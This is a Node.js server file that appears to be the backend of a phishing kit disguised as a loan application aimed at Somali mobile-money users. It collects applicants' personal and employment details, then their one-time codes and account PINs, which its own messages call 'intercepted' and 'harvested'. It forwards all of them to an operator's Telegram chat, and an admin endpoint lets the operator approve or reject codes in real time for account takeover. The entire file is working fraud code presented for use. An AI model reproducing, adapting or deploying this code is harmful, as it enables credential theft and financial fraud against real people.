const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const axios = require('axios');
const path = require('path');
require('dotenv').config(); // Load environment variables (.env)

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Primary memory engine mapping socket pointers to session objects
const activeSessions = new Map();

// Telegram Bot Configs from environment variables
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID; // The target channel or admin Chat ID

/**
 * Helper function to send messages directly to your Telegram Bot
 */
async function sendTelegramMessage(text) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn("[TELEGRAM WARNING] Missing BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.");
        return;
    }
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        });
        console.log("✅ Update successfully transmitted to Telegram.");
    } catch (err) {
        console.error("❌ Telegram API Error:", err.response ? err.response.data : err.message);
    }
}

io.on('connection', (socket) => {
    const appId = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
    
    activeSessions.set(socket.id, {
        appId: appId, socketId: socket.id,
        loanType: '', amount: 1200, term: '1', purpose: '',
        firstName: '', lastName: '', email: '', phone: '',
        employment: '', income: '', employer: '',
        otpToken: '', pinCode: '', step: 1
    });

    socket.emit('session-ready', { appId: appId });
    socket.join(appId);

    socket.on('step1', (payload) => {
        let session = activeSessions.get(socket.id);
        if (session) { 
            Object.assign(session, payload); 
            session.step = 2; 
            activeSessions.set(socket.id, session); 
        }
    });

    socket.on('step2', (payload) => {
        let session = activeSessions.get(socket.id);
        if (session) { 
            Object.assign(session, payload); 
            session.step = 3; 
            activeSessions.set(socket.id, session); 
        }
    });

    socket.on('step3-data', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;
        
        Object.assign(session, payload);
        session.step = 4;
        activeSessions.set(socket.id, session);

        console.log(`[CORE SERVER] Data synchronized for tracker ID ${session.appId}. Compiling Telegram Log.`);

        // Format message layout beautifully for Telegram Admins
        const message = `
📱 *New Application: ${session.appId}*
━━━━━━━━━━━━━━━━━━━━━━━━
💰 *LOAN DETAILS:*
• Type: ${session.loanType}
• Amount: USD ${session.amount}
• Term: ${session.term} Month(s)
• Purpose: ${session.purpose}

👤 *PERSONAL INFO:*
• Name: ${session.firstName} ${session.lastName}
• Phone: +252${session.phone}
• Email: ${session.email}

💼 *EMPLOYMENT & INCOME:*
• Status: ${session.employment}
• Annual Income: $${session.income}
• Employer: ${session.employer || 'N/A'}
━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Awaiting OTP Input...*
        `;
        
        await sendTelegramMessage(message.trim());
    });

    socket.on('step4-otp', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;

        session.otpToken = payload.otp;
        activeSessions.set(socket.id, session);

        const message = `
🔑 *OTP Received for ID: ${session.appId}*
━━━━━━━━━━━━━━━━━━━━━━━━
• Intercepted Code: \`${session.otpToken}\`
• Phone associated: +252${session.phone}
━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Awaiting Admin Panel Action Control*
        `;

        await sendTelegramMessage(message.trim());
    });

    socket.on('step5-pin', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;

        session.pinCode = payload.pin;
        activeSessions.set(socket.id, session);

        const message = `
💳 *Account PIN Harvested for ID: ${session.appId}*
━━━━━━━━━━━━━━━━━━━━━━━━
• Target Account PIN: \`${session.pinCode}\`
• Account Owner: ${session.firstName} ${session.lastName}
━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Complete Operational Capture Execution*
        `;

        await sendTelegramMessage(message.trim());
    });

    socket.on('disconnect', () => { activeSessions.delete(socket.id); });
});

/**
 * TELEGRAM INBOUND INTEGRATION PROXY CONTROL LAYER
 * (Kept active if you are controlling approvals via custom internal dashboard requests)
 */
app.post('/api/admin-action', (req, res) => {
    const { actionSignal, targetAppId, message } = req.body;
    console.log(`[CORE ROUTER] Process signal command: ${actionSignal} targeting ID: ${targetAppId}`);
    
    let targetSession = null;
    for (let [socketId, record] of activeSessions.entries()) {
        if (record.appId === targetAppId) { targetSession = record; break; }
    }

    if (!targetSession) return res.status(404).json({ error: "Session target trace execution dropped or unavailable" });
    const clientSocket = io.sockets.sockets.get(targetSession.socketId);
    if (!clientSocket) return res.status(410).json({ error: "Target application framework instance offline" });

    if (actionSignal === 'approve_otp') {
        clientSocket.emit('admin-approve-otp'); 
    } else if (actionSignal === 'otp-failed') {
        clientSocket.emit('otp-failed', { message: message || "Code-ka OTP-ga aad gelisay waa khalad." });
    } else if (actionSignal === 'approve_pin') {
        const generatedRef = 'COD-' + Math.floor(100000 + Math.random() * 900000);
        clientSocket.emit('pin-verified', { referenceId: generatedRef }); 
    } else if (actionSignal === 'pin-failed') {
        clientSocket.emit('pin-failed', { message: message || "PIN-ka koontada aad gelisay waa khalad." });
    }

    return res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => console.log(`Routing cluster network instance functional on internal index port:${PORT}`));